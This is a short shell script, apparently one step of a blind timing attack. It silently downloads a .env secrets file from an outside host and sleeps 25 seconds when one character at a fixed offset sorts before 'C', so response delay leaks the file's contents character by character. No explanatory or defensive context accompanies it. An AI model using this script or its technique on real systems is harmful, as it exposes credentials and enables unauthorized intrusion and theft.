#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +24 /wa|head -c1)" < 'C' ]&&sleep 25
sleep 12
